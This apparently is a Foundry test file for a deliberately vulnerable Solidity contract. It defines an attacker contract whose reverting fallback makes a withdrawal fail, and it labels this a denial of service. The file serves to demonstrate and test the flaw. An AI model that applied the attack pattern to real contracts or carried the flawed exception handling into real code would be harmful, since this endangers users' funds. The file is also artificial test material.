pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/2.1.1-Improper-Use-of-Exception-Handling-Functions-vulnerability.sol";

// A malicious attacker contract without a receive() function so that fallback is triggered
// and its fallback intentionally reverts. This will simulate the DoS attack.
contract MaliciousAttacker {
    Vulnerable public vulnerable;

    constructor(address payable _vulnerable) {
        vulnerable = Vulnerable(_vulnerable);
    }

    // Attack function: deposit 1 ETH then withdraw, expecting the transfer to trigger the fallback
    // which will revert, causing the whole withdraw to revert.
    function attack() public payable {
        require(msg.value == 1 ether, "Need 1 ether");
        vulnerable.deposit{value: 1 ether}();
        // This withdraw call will try to transfer 1 ether to this contract.
        // Since this contract does not implement receive(), the fallback is called, which reverts.
        vulnerable.withdraw(1 ether);
    }

    // No receive() function is provided, so when Ether is sent with empty calldata,
    // the fallback function is executed and it reverts as designed.
    fallback() external payable {
        revert("Fallback triggered revert");
    }
}

contract VulnerableTest is Test {
    Vulnerable vulnerable;
    Attacker benignAttacker; // The attacker from the source code (has a defined receive() and won't revert)
    MaliciousAttacker maliciousAttacker;

    function setUp() public {
        vulnerable = new Vulnerable();
        benignAttacker = new Attacker(payable(address(vulnerable)));
        maliciousAttacker = new MaliciousAttacker(payable(address(vulnerable)));
    }

    // This test shows that a normal user (or even the benign attacker) can withdraw their funds successfully.
    // In this test, an externally owned account deposits and withdraws without triggering any fallback revert.
    function testNormalWithdrawal() public {
        address user = address(0xABcD);
        vm.deal(user, 2 ether);
        vm.prank(user);
        vulnerable.deposit{value: 1 ether}();
        vm.prank(user);
        vulnerable.withdraw(1 ether);
        uint256 balance = vulnerable.balances(user);
        assertEq(balance, 0, "User balance should be 0 after withdrawal");
    }

    // This test demonstrates the vulnerability. Using a malicious attacker contract with a reverting fallback,
    // the withdraw operation will revert, blocking the attacker contract from withdrawing its funds and causing a DoS.
    function testAttackWithdrawRevert() public {
        // Fund the malicious attacker contract
        vm.deal(address(maliciousAttacker), 2 ether);
        // Expect the call to revert with the malicious fallback message
        vm.expectRevert(bytes("Fallback triggered revert"));
        maliciousAttacker.attack{value: 1 ether}();
    }
}
